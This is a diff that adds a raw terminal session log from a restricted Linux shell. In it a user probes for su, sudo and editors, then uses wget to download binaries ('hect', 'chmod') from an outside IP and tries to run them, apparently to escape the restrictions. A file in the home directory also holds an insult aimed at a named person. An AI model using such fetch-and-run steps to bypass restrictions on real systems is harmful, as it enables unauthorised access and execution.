@@ -1,0 +1,564 @@
+Script started on 2020-06-05 12:39:09+02:00
+admin@ip-172-31-23-144:~$ ls
+
+admin@ip-172-31-23-144:~$ wget      cu  
+!          caller     dirs       export     in         pwd        suspend    umask
+./         case       disown     false      jobs       read       test       unalias
+:          cat        do         fc         kill       readarray  then       unset
+[          cd         done       fg         let        readonly   time       until
+[[         command    echo       fi         local      return     times      wait
+]]         compgen    elif       for        logout     salir      touch      wget
+alias      complete   else       function   ls         script     trap       while
+bash       compopt    enable     getopts    mapfile    select     true       who
+bg         continue   esac       hash       mkdir      set        tty        {
+bind       coproc     eval       help       popd       shift      type       }
+break      date       exec       history    printf     shopt      typeset    
+builtin    declare    exit       if         pushd      source     ulimit     
+admin@ip-172-31-23-144:~$ cd # ~
+admin@ip-172-31-23-144:~$ cd ..
+admin@ip-172-31-23-144:/home$ ls
+admin  guest  iotadmin	mysql  oracle  postgres  support  test	user
+admin@ip-172-31-23-144:/home$ ls -la
+total 16
+drwxr-xr-x. 12        0 root  143 Jun  3 18:54 .
+drwxr-xr-x.  6        0 root  100 May 10 16:04 ..
+drwxrwx---.  2 admin    root   24 Jun  1 12:17 .byeA
+drwx------.  4 admin    1003 4096 Jun  5 12:39 admin
+drwx------.  3 guest    1010   54 Jun  3 18:54 guest
+drwx------.  3 iotadmin 1002   92 May 29 16:20 iotadmin
+drwx------.  3 mysql    1008  111 Jun  3 18:51 mysql
+drwx------.  3 oracle   1007  111 Jun  3 18:45 oracle
+drwx------.  3 postgres 1009  111 Jun  3 18:56 postgres
+drwx------.  3 support  1006 4096 Jun  5 11:49 support
+drwx------.  3 test     1005 4096 Jun  4 09:45 test
+drwx------.  3 user     1004  147 Jun  4 09:45 user
+admin@ip-172-31-23-144:/home$ cat .byeA/
+cat: .byeA/: Is a directory
+admin@ip-172-31-23-144:/home$ cd .byeA/
+admin@ip-172-31-23-144:/home/.byeA$ ls
+logout.log
+admin@ip-172-31-23-144:/home/.byeA$ cat logout.log 
+loll
+admin@ip-172-31-23-144:/home/.byeA$ c  d ..
+admin@ip-172-31-23-144:/home$ cd ..
+admin@ip-172-31-23-144:/$ ls
+bin  dep.sh  dev  etc  home  lib  lib64  usr
+admin@ip-172-31-23-144:/$ cd  cat fe  dep.sh 
+cat: dep.sh: Permission denied
+admin@ip-172-31-23-144:/$ ls -la
+total 4
+drwxr-xr-x.  6 0 root 100 May 10 16:04 .
+drwxr-xr-x.  6 0 root 100 May 10 16:04 ..
+lrwxrwxrwx.  1 0 root   7 May  3 17:26 bin -> usr/bin
+-rwx------.  1 0 root 240 May  3 18:09 dep.sh
+drwxr-xr-x.  3 0 root  78 May 29 15:47 dev
+drwxr-xr-x.  2 0 root  71 Jun  3 18:59 etc
+drwxr-xr-x. 12 0 root 143 Jun  3 18:54 home
+lrwxrwxrwx.  1 0 root   7 May  3 17:27 lib -> usr/lib
+lrwxrwxrwx.  1 0 root  10 May  3 17:27 lib64 -> usr/lib64/
+drwxr-xr-x.  6 0 root  54 May 10 16:02 usr
+admin@ip-172-31-23-144:/$ su - root
+bash: su: command not found
+admin@ip-172-31-23-144:/$ cd ..
+admin@ip-172-31-23-144:/$ ls
+bin  dep.sh  dev  etc  home  lib  lib64  usr
+admin@ip-172-31-23-144:/$ cd de
+bash: cd: de: No such file or directory
+admin@ip-172-31-23-144:/$ ls
+bin  dep.sh  dev  etc  home  lib  lib64  usr
+admin@ip-172-31-23-144:/$ cd dev/
+admin@ip-172-31-23-144:/dev$ ls
+null  ptmx  pts  random  tty  zero
+admin@ip-172-31-23-144:/dev$ ls -la
+total 0
+drwxr-xr-x. 3 0 root   78 May 29 15:47 .
+drwxr-xr-x. 6 0 root  100 May 10 16:04 ..
+crw-rw-rw-. 1 0 root 1, 3 May  3 17:24 null
+crw-rw-rw-. 1 0 root 5, 2 Jun  5  2020 ptmx
+drwxr-xr-x. 2 0 root    0 May  3 16:14 pts
+crw-rw-rw-. 1 0 root 1, 8 May  3 17:24 random
+crw-rw-rw-. 1 0 root 5, 0 May  3 17:24 tty
+crw-rw-rw-. 1 0 root 1, 5 May  3 17:24 zero
+admin@ip-172-31-23-144:/dev$ ls &b  /o bin
+bash  cat  cd  date  ls  mkdir	script	touch  tty  wget  who
+admin@ip-172-31-23-144:/dev$ who
+admin@ip-172-31-23-144:/dev$ script        cd /desh
+bash: cd: /desh: No such file or directory
+admin@ip-172-31-23-144:/dev$ cd /sh  de
+dep.sh  dev/    
+admin@ip-172-31-23-144:/dev$ cd /de
+dep.sh  dev/    
+admin@ip-172-31-23-144:/dev$ cd /dev/sh  
+admin@ip-172-31-23-144:/dev$ ls
+null  ptmx  pts  random  tty  zero
+admin@ip-172-31-23-144:/dev$ cd ..
+admin@ip-172-31-23-144:/$ ls
+bin  dep.sh  dev  etc  home  lib  lib64  usr
+admin@ip-172-31-23-144:/$ bash      base53  64
+bash: base64: command not found
+admin@ip-172-31-23-144:/$ cat     ls
+bin  dep.sh  dev  etc  home  lib  lib64  usr
+admin@ip-172-31-23-144:/$ cd ~
+admin@ip-172-31-23-144:~$ ls
+Hector_retard.sh  JOAN
+admin@ip-172-31-23-144:~$ echo | xc         vim   echo "" > hect5D5D    [3@ELF[1P[1P[1P" > hect              w wget 37.15.143.0/hect
+--2020-06-05 12:46:03--  http://37.15.143.0/hect
+Connecting to 37.15.143.0:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1036536 (1012K) [application/octet-stream]
+Saving to: 'hect'
+
+hect                      0%[                               ]       0  --.-KB/s               hect                     12%[==>                            ] 124.44K   622KB/s               hect                     23%[======>                        ] 234.73K   575KB/s               hect                     34%[=========>                     ] 346.45K   567KB/s               hect                     46%[=============>                 ] 473.71K   582KB/s               hect                     61%[==================>            ] 622.19K   613KB/s               hect                     76%[======================>        ] 773.49K   636KB/s               hect                     91%[===========================>   ] 929.04K   656KB/s               hect                    100%[==============================>]   1012K   669KB/s    in 1.5s    
+
+2020-06-05 12:46:05 (669 KB/s) - 'hect' saved [1036536/1036536]
+
+admin@ip-172-31-23-144:~$ ls
+Hector_retard.sh  JOAN	hect
+admin@ip-172-31-23-144:~$ chmod +x hect 
+bash: chmod: command not found
+admin@ip-172-31-23-144:~$ ./hect
+bash: ./hect: Permission denied
+admin@ip-172-31-23-144:~$ ls -ka
+.			      .Rand_344-Jun_05-session.log  .Rand_916-Jun_05-session.log
+..			      .Rand_362-Jun_01-session.log  .Rand_968-Jun_05-session.log
+.Rand_110-Jun_05-session.log  .Rand_368-Jun_05-session.log  .Rand_996-Jun_05-session.log
+.Rand_134-Jun_05-session.log  .Rand_430-Jun_05-session.log  .bash_history
+.Rand_15-Jun_05-session.log   .Rand_473-Jun_05-session.log  .bash_profile
+.Rand_222-Jun_05-session.log  .Rand_551-Jun_05-session.log  .bashrc
+.Rand_224-Jun_03-session.log  .Rand_607-Jun_05-session.log  .bye
+.Rand_227-Jun_05-session.log  .Rand_670-Jun_05-session.log  .logout.log
+.Rand_233-Jun_05-session.log  .Rand_682-Jun_01-session.log  Hector_retard.sh
+.Rand_309-Jun_05-session.log  .Rand_875-Jun_01-session.log  JOAN
+.Rand_316-Jun_05-session.log  .Rand_881-Jun_05-session.log  hect
+admin@ip-172-31-23-144:~$ ls -    ls  ls -la
+total 1064
+drwx------.  4 admin 1003    4096 Jun  5 12:46 .
+drwxr-xr-x. 12     0 root     143 Jun  3 18:54 ..
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_110-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_134-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_15-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_222-Jun_05-session.log
+-rw-------.  1 admin 1003     124 Jun  3 18:41 .Rand_224-Jun_03-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_227-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_233-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_309-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_316-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_344-Jun_05-session.log
+-rw-------.  1 admin 1003     143 Jun  1 18:50 .Rand_362-Jun_01-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_368-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:28 .Rand_430-Jun_05-session.log
+-rw-------.  1 admin 1003    4096 Jun  5 12:43 .Rand_473-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_551-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_607-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_670-Jun_05-session.log
+-rw-------.  1 admin 1003    4879 Jun  1 17:21 .Rand_682-Jun_01-session.log
+-rw-------.  1 admin 1003       0 Jun  1 21:07 .Rand_875-Jun_01-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_881-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_916-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_968-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_996-Jun_05-session.log
+-rw-------.  1 admin 1003    2139 Jun  3 18:41 .bash_history
+-rwxr--r--.  1     0 root     160 May 29 17:57 .bash_profile
+-rwxr--r--.  1     0 root     507 Jun  4 09:46 .bashrc
+drwx------.  2 admin 1003      21 Jun  1 15:44 .bye
+-rw-------.  1 admin 1003     773 Jun  1 12:08 .logout.log
+-rw-------.  1 admin 1003      31 Jun  1 17:19 Hector_retard.sh
+drwx------.  2 admin 1003       6 Jun  1 17:15 JOAN
+-rw-------.  1 admin 1003 1036536 Jun  5 12:39 hect
+admin@ip-172-31-23-144:~$ [Kadmin@ip-172-31-23-144:~$ cat .Rand_     .Rand_362-Jun_01-session.log
+cat: ..Rand_362-Jun_01-session.log: No such file or directory
+admin@ip-172-31-23-144:~$ cat .Rand_362-Jun_01-session.log
+Script started on 2020-06-01 18:50:00+02:00
+admin@ip-172-31-23-144:~$ ls
+Hector_retard.sh  JOAN
+admin@ip-172-31-23-144:~$ rm    exit
+admin@ip-172-31-23-144:~$ cat .Rand_682-Jun_01-session.log
+Script started on 2020-06-01 17:14:51+02:00
+admin@ip-172-31-23-144:~$ mkdir     mkdir JOANM 
+admin@ip-172-31-23-144:~$ ls
+JOAN
+admin@ip-172-31-23-144:~$ cd Joan   OAN/
+admin@ip-172-31-23-144:~/JOAN$ nano Hector t   r_retard.txt   sh
+bash: nano: command not found
+admin@ip-172-31-23-144:~/JOAN$ nano Hector_retard.sh[1P[1P[1P[1P[1@v[1@i
+bash: vi: command not found
+admin@ip-172-31-23-144:~/JOAN$ vim
+bash: vim: command not found
+admin@ip-172-31-23-144:~/JOAN$ apt-get install nano
+bash: apt-get: command not found
+admin@ip-172-31-23-144:~/JOAN$ rm  sudo
+bash: sudo: command not found
+admin@ip-172-31-23-144:~/JOAN$ su
+bash: su: command not found
+admin@ip-172-31-23-144:~/JOAN$ cd ..
+admin@ip-172-31-23-144:~$ rn m  cd ..
+admin@ip-172-31-23-144:/home$ cd ..
+admin@ip-172-31-23-144:/$ cd ..
+admin@ip-172-31-23-144:/$ cd ..
+admin@ip-172-31-23-144:/$ cd ..
+admin@ip-172-31-23-144:/$ cd 
+admin@ip-172-31-23-144:~$ cd ..
+admin@ip-172-31-23-144:/home$ cd ..
+admin@ip-172-31-23-144:/$ cd ..
+admin@ip-172-31-23-144:/$ cd ..
+admin@ip-172-31-23-144:/$ ll
+bash: ll: command not found
+admin@ip-172-31-23-144:/$ ls -l
+total 4
+lrwxrwxrwx. 1 0 root   7 May  3 17:26 bin -> usr/bin
+-rwx------. 1 0 root 240 May  3 18:09 dep.sh
+drwxr-xr-x. 3 0 root  78 May 29 15:47 dev
+drwxr-xr-x. 2 0 root  71 Jun  1 12:12 etc
+drwxr-xr-x. 5 0 root  48 Jun  1 12:40 home
+lrwxrwxrwx. 1 0 root   7 May  3 17:27 lib -> usr/lib
+lrwxrwxrwx. 1 0 root  10 May  3 17:27 lib64 -> usr/lib64/
+drwxr-xr-x. 6 0 root  54 May 10 16:02 usr
+admin@ip-172-31-23-144:/$ rm ./[1@-[1@R[1@ 
+bash: rm: command not found
+admin@ip-172-31-23-144:/$ mkdir
+mkdir: missing operand
+Try 'mkdir --help' for more information.
+admin@ip-172-31-23-144:/$ mv ./
+bash: mv: command not found
+admin@ip-172-31-23-144:/$ gedit
+bash: gedit: command not found
+admin@ip-172-31-23-144:/$ vi
+bash: vi: command not found
+admin@ip-172-31-23-144:/$ vim
+bash: vim: command not found
+admin@ip-172-31-23-144:/$ exit    touch
+touch: missing file operand
+Try 'touch --help' for more information.
+admin@ip-172-31-23-144:/$ touch --help
+Usage: touch [OPTION]... FILE...
+Update the access and modification times of each FILE to the current time.
+
+A FILE argument that does not exist is created empty, unless -c or -h
+is supplied.
+
+A FILE argument string of - is handled specially and causes touch to
+change the times of the file associated with standard output.
+
+Mandatory arguments to long options are mandatory for short options too.
+  -a                     change only the access time
+  -c, --no-create        do not create any files
+  -d, --date=STRING      parse STRING and use it instead of current time
+  -f                     (ignored)
+  -h, --no-dereference   affect each symbolic link instead of any referenced
+                         file (useful only on systems that can change the
+                         timestamps of a symlink)
+  -m                     change only the modification time
+  -r, --reference=FILE   use this file's times instead of current time
+  -t STAMP               use [[CC]YY]MMDDhhmm[.ss] instead of current time
+      --time=WORD        change the specified time:
+                           WORD is access, atime, or use: equivalent to -a
+                           WORD is modify or mtime: equivalent to -m
+      --help     display this help and exit
+      --version  output version information and exit
+
+Note that the -d and -t options accept different time-date formats.
+
+GNU coreutils online help: <https://www.gnu.org/software/coreutils/>
+Report touch translation bugs to <https://translationproject.org/team/>
+Full documentation at: <https://www.gnu.org/software/coreutils/touch>
+or available locally via: info '(coreutils) touch invocation'
+admin@ip-172-31-23-144:/$ touch --help[K[2Pvimtouch --help[K5t  touch Hecotr   tor retar       r_retart d.sh
+touch: cannot touch 'Hector_retard.sh': Permission denied
+admin@ip-172-31-23-144:/$ sudo
+bash: sudo: command not found
+admin@ip-172-31-23-144:/$ sudo su
+bash: sudo: command not found
+admin@ip-172-31-23-144:/$ cd
+admin@ip-172-31-23-144:~$ touch       cdsudo su[Ktouch Hector_retard.sh
+admin@ip-172-31-23-144:~$ echo vaya tela amb el tonto aquest. > Hector_retard.sh  
+admin@ip-172-31-23-144:~$ more Hector_retard.sh 
+bash: more: command not found
+admin@ip-172-31-23-144:~$ ./  ./H
+bash: ./H: No such file or directory
+admin@ip-172-31-23-144:~$ ls
+Hector_retard.sh  JOAN
+admin@ip-172-31-23-144:~$ ./H   chmod
+bash: chmod: command not found
+admin@ip-172-31-23-144:~$ chown
+bash: chown: command not found
+admin@ip-172-31-23-144:~$ exit
+exit
+
+Script done on 2020-06-01 17:21:08+02:00
+admin@ip-172-31-23-144:~$ ch  ls -la
+total 1072
+drwx------.  4 admin 1003    4096 Jun  5 12:46 .
+drwxr-xr-x. 12     0 root     143 Jun  3 18:54 ..
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_110-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_134-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_15-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_222-Jun_05-session.log
+-rw-------.  1 admin 1003     124 Jun  3 18:41 .Rand_224-Jun_03-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_227-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_233-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_309-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_316-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_344-Jun_05-session.log
+-rw-------.  1 admin 1003     143 Jun  1 18:50 .Rand_362-Jun_01-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_368-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:28 .Rand_430-Jun_05-session.log
+-rw-------.  1 admin 1003   12288 Jun  5 12:46 .Rand_473-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_551-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_607-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_670-Jun_05-session.log
+-rw-------.  1 admin 1003    4879 Jun  1 17:21 .Rand_682-Jun_01-session.log
+-rw-------.  1 admin 1003       0 Jun  1 21:07 .Rand_875-Jun_01-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_881-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_916-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_968-Jun_05-session.log
+-rw-------.  1 admin 1003       0 Jun  5 12:27 .Rand_996-Jun_05-session.log
+-rw-------.  1 admin 1003    2139 Jun  3 18:41 .bash_history
+-rwxr--r--.  1     0 root     160 May 29 17:57 .bash_profile
+-rwxr--r--.  1     0 root     507 Jun  4 09:46 .bashrc
+drwx------.  2 admin 1003      21 Jun  1 15:44 .bye
+-rw-------.  1 admin 1003     773 Jun  1 12:08 .logout.log
+-rw-------.  1 admin 1003      31 Jun  1 17:19 Hector_retard.sh
+drwx------.  2 admin 1003       6 Jun  1 17:15 JOAN
+-rw-------.  1 admin 1003 1036536 Jun  5 12:39 hect
+admin@ip-172-31-23-144:~$ rm hect 
+bash: rm: command not found
+admin@ip-172-31-23-144:~$ pyth    ls /usr/sbi       usr/loc  ib       sbin
+ls: cannot access '/sbin': No such file or directory
+admin@ip-172-31-23-144:~$ ls
+Hector_retard.sh  JOAN	hect
+admin@ip-172-31-23-144:~$ cd /
+admin@ip-172-31-23-144:/$ ls
+bin  dep.sh  dev  etc  home  lib  lib64  usr
+admin@ip-172-31-23-144:/$ ls -la
+total 4
+drwxr-xr-x.  6 0 root 100 May 10 16:04 .
+drwxr-xr-x.  6 0 root 100 May 10 16:04 ..
+lrwxrwxrwx.  1 0 root   7 May  3 17:26 bin -> usr/bin
+-rwx------.  1 0 root 240 May  3 18:09 dep.sh
+drwxr-xr-x.  3 0 root  78 May 29 15:47 dev
+drwxr-xr-x.  2 0 root  71 Jun  3 18:59 etc
+drwxr-xr-x. 12 0 root 143 Jun  3 18:54 home
+lrwxrwxrwx.  1 0 root   7 May  3 17:27 lib -> usr/lib
+lrwxrwxrwx.  1 0 root  10 May  3 17:27 lib64 -> usr/lib64/
+drwxr-xr-x.  6 0 root  54 May 10 16:02 usr
+admin@ip-172-31-23-144:/$ cd usr/
+admin@ip-172-31-23-144:/usr$ ls
+bin  lib  lib64  share
+admin@ip-172-31-23-144:/usr$ cd bin/i 
+admin@ip-172-31-23-144:/usr/bin$ ls
+bash  cat  cd  date  ls  mkdir	script	touch  tty  wget  who
+admin@ip-172-31-23-144:/usr/bin$ wget --h v  v
+wget: missing URL
+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options.
+admin@ip-172-31-23-144:/usr/bin$ wget -v .ver    -version
+GNU Wget 1.19.5 built on linux-gnu.
+
+-cares +digest +gpgme +https +ipv6 +iri +large-file +metalink +nls 
++ntlm +opie +psl +ssl/gnutls 
+
+Wgetrc: 
+    /etc/wgetrc (system)
+Locale: 
+    /usr/share/locale 
+Compile: 
+    gcc -DHAVE_CONFIG_H -DSYSTEM_WGETRC="/etc/wgetrc" 
+    -DLOCALEDIR="/usr/share/locale" -I. -I../lib -I../lib 
+    -I/usr/include/p11-kit-1 -DHAVE_LIBGNUTLS -DNDEBUG -O2 -g -pipe 
+    -Wall -Werror=format-security -Wp,-D_FORTIFY_SOURCE=2 
+    -Wp,-D_GLIBCXX_ASSERTIONS -fexceptions -fstack-protector-strong 
+    -grecord-gcc-switches 
+    -specs=/usr/lib/rpm/redhat/redhat-hardened-cc1 
+    -specs=/usr/lib/rpm/redhat/redhat-annobin-cc1 -m64 -mtune=generic 
+    -fasynchronous-unwind-tables -fstack-clash-protection 
+    -fcf-protection 
+Link: 
+    gcc -I/usr/include/p11-kit-1 -DHAVE_LIBGNUTLS -DNDEBUG -O2 -g -pipe 
+    -Wall -Werror=format-security -Wp,-D_FORTIFY_SOURCE=2 
+    -Wp,-D_GLIBCXX_ASSERTIONS -fexceptions -fstack-protector-strong 
+    -grecord-gcc-switches 
+    -specs=/usr/lib/rpm/redhat/redhat-hardened-cc1 
+    -specs=/usr/lib/rpm/redhat/redhat-annobin-cc1 -m64 -mtune=generic 
+    -fasynchronous-unwind-tables -fstack-clash-protection 
+    -fcf-protection -Wl,-z,relro -Wl,-z,now 
+    -specs=/usr/lib/rpm/redhat/redhat-hardened-ld -luuid -lidn2 
+    -L/usr/lib64 -lgpgme -lmetalink -lnettle -lgnutls -lz -lpsl 
+    ftp-opie.o gnutls.o http-ntlm.o ../lib/libgnu.a 
+
+Copyright (C) 2015 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later
+<http://www.gnu.org/licenses/gpl.html>.
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+Originally written by Hrvoje Niksic <hniksic@xemacs.org>.
+Please send bug reports and questions to <bug-wget@gnu.org>.
+admin@ip-172-31-23-144:/usr/bin$ [Kadmin@ip-172-31-23-144:/usr/bin$ wget --versionv[Kls[Kcd bin/ls[Kcd usr/[1Pls -la[K -lacd usr/ls[Kcd bin/ls[Kwget -v-version[K     cd ~
+admin@ip-172-31-23-144:~$ ls
+Hector_retard.sh  JOAN	hect
+admin@ip-172-31-23-144:~$ mkdir pruebas
+admin@ip-172-31-23-144:~$ mv hect pruebas/
+bash: mv: command not found
+admin@ip-172-31-23-144:~$ ls
+Hector_retard.sh  JOAN	hect  pruebas
+admin@ip-172-31-23-144:~$ cd hect 
+bash: cd: hect: Not a directory
+admin@ip-172-31-23-144:~$ cd  cd h r pruebas/
+admin@ip-172-31-23-144:~/pruebas$ ls
+admin@ip-172-31-23-144:~/pruebas$ [12P(reverse-i-search)`': w': wget --version[1@g': [1@e': [1@t': wget -v[Kwget 37.15.143.0/hect[8@admin@ip-172-31-23-144:~/pruebas$ wget 37.15.143.0/hect    chmod
+--2020-06-05 12:50:53--  http://37.15.143.0/chmod
+Connecting to 37.15.143.0:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 64288 (63K) [application/octet-stream]
+Saving to: 'chmod'
+
+chmod                     0%[                               ]       0  --.-KB/s               chmod                   100%[==============================>]  62.78K  --.-KB/s    in 0.1s    
+
+2020-06-05 12:50:53 (452 KB/s) - 'chmod' saved [64288/64288]
+
+admin@ip-172-31-23-144:~/pruebas$ ls
+chmod
+admin@ip-172-31-23-144:~/pruebas$ ls -la
+total 72
+drwx------. 2 admin 1003    19 Jun  5 12:50 .
+drwx------. 5 admin 1003  4096 Jun  5 12:50 ..
+-rw-------. 1 admin 1003 64288 Jun  5 12:50 chmod
+admin@ip-172-31-23-144:~/pruebas$ chmo    whoami
+bash: whoami: command not found
+admin@ip-172-31-23-144:~/pruebas$ ls
+chmod
+admin@ip-172-31-23-144:~/pruebas$ ch  ./ch    cd /
+bin/    dep.sh  dev/    etc/    home/   lib/    lib64/  usr/    
+admin@ip-172-31-23-144:~/pruebas$ cd /etc/
+admin@ip-172-31-23-144:/etc$ ls
+group  localtime  nsswitch.conf  passwd
+admin@ip-172-31-23-144:/etc$ cat nsswitch.conf 
+# Generated by authselect on Thu Apr 23 05:18:57 2020
+# Do not modify this file manually.
+
+# If you want to make changes to nsswitch.conf please modify
+# /etc/authselect/user-nsswitch.conf and run 'authselect apply-changes'.
+#
+# Note that your changes may not be applied as they may be
+# overwritten by selected profile. Maps set in the authselect
+# profile takes always precedence and overwrites the same maps
+# set in the user file. Only maps that are not set by the profile
+# are applied from the user file.
+#
+# For example, if the profile sets:
+#     passwd: sss files
+# and /etc/authselect/user-nsswitch.conf contains:
+#     passwd: files
+#     hosts: files dns
+# the resulting generated nsswitch.conf will be:
+#     passwd: sss files # from profile
+#     hosts: files dns  # from user file
+
+passwd:     sss files systemd
+group:      sss files systemd
+netgroup:   sss files
+automount:  sss files
+services:   sss files
+
+# Included from /etc/authselect/user-nsswitch.conf
+
+#
+# /etc/nsswitch.conf
+#
+# Name Service Switch config file. This file should be
+# sorted with the most-used services at the beginning.
+#
+# Valid databases are: aliases, ethers, group, gshadow, hosts,
+# initgroups, netgroup, networks, passwd, protocols, publickey,
+# rpc, services, and shadow.
+#
+# Valid service provider entries include (in alphabetical order):
+#
+#	compat			Use /etc files plus *_compat pseudo-db
+#	db			Use the pre-processed /var/db files
+#	dns			Use DNS (Domain Name Service)
+#	files			Use the local files in /etc
+#	hesiod			Use Hesiod (DNS) for user lookups
+#	nis			Use NIS (NIS version 2), also called YP
+#	nisplus			Use NIS+ (NIS version 3)
+#
+# See `info libc 'NSS Basics'` for more information.
+#
+# Commonly used alternative service providers (may need installation):
+#
+#	ldap			Use LDAP directory server
+#	myhostname		Use systemd host names
+#	mymachines		Use systemd machine names
+#	mdns*, mdns*_minimal	Use Avahi mDNS/DNS-SD
+#	resolve			Use systemd resolved resolver
+#	sss			Use System Security Services Daemon (sssd)
+#	systemd			Use systemd for dynamic user option
+#	winbind			Use Samba winbind support
+#	wins			Use Samba wins support
+#	wrapper			Use wrapper module for testing
+#
+# Notes:
+#
+# 'sssd' performs its own 'files'-based caching, so it should generally
+# come before 'files'.
+#
+# WARNING: Running nscd with a secondary caching service like sssd may
+# 	   lead to unexpected behaviour, especially with how long
+# 	   entries are cached.
+#
+# Installation instructions:
+#
+# To use 'db', install the appropriate package(s) (provide 'makedb' and
+# libnss_db.so.*), and place the 'db' in front of 'files' for entries
+# you want to be looked up first in the databases, like this:
+#
+# passwd:    db files
+# shadow:    db files
+# group:     db files
+
+# In order of likelihood of use to accelerate lookup.
+shadow:     files sss
+hosts:      files dns myhostname
+
+aliases:    files
+ethers:     files
+gshadow:    files
+# Allow initgroups to default to the setting for group.
+# initgroups: files
+networks:   files dns
+protocols:  files
+publickey:  files
+rpc:        files
+admin@ip-172-31-23-144:/etc$ [Kadmin@ip-172-31-23-144:/etc$ cd ..
+admin@ip-172-31-23-144:/$ ls
+bin  dep.sh  dev  etc  home  lib  lib64  usr
+admin@ip-172-31-23-144:/$ cd usr/
+admin@ip-172-31-23-144:/usr$ ls
+bin  lib  lib64  share
+admin@ip-172-31-23-144:/usr$ cd share/
+admin@ip-172-31-23-144:/usr/share$ ls
+terminfo
+admin@ip-172-31-23-144:/usr/share$ file terminfo/
+bash: file: command not found
+admin@ip-172-31-23-144:/usr/share$ cd terminfo/
+admin@ip-172-31-23-144:/usr/share/terminfo$ ls
+A  E  a  b  c  d  e  g	h  j  k  l  m  n  p  r	s  t  v  w  x
+admin@ip-172-31-23-144:/usr/share/terminfo$ cd A/
+admin@ip-172-31-23-144:/usr/share/terminfo/A$ ls
+Apple_Terminal
+admin@ip-172-31-23-144:/usr/share/terminfo/A$ cat Apple_Terminal 
